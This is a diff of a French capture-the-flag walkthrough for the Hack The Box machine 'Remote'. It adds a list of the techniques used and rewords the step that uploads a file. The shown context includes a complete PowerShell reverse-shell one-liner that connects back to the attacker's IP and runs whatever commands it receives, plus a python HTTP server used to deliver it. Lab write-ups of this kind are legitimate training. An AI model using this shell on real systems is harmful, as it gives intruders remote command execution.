@@ -4,6 +4,10 @@
 Remote est une machine Windows dont l'adresse IP est 10.10.10.180.</br>
 Compétences mises en oeuvre :
 * Enumération des ports et services d'une machine distante.
+* Enumération des fichiers/dossiers d'un site web.
+* Montage d'un répertoire partagés.
+* Transfert de fichier de l'attaquant à la box en powershell.
+* Elévation de privilège via une ancienne version de TeamViewer.
 </br>
 
 # Enumération initiale
@@ -67,7 +71,7 @@ Contenu du fichier shell.ps1 :
 ```bash
 $client = New-Object System.Net.Sockets.TCPClient("10.10.14.43",8000);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "# ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
 ```
-Maintenant pour l'upload, nous allons mettre un serveur python3 en place et sur la box, récupérer le shell avec powershell :
+Maintenant pour l'upload, nous allons mettre un serveur python3 en place, un listener sur le port 4567 et envoyer le shell avec powershell sur la box :
 ```bash
 $ python3 -m http.server
 ```
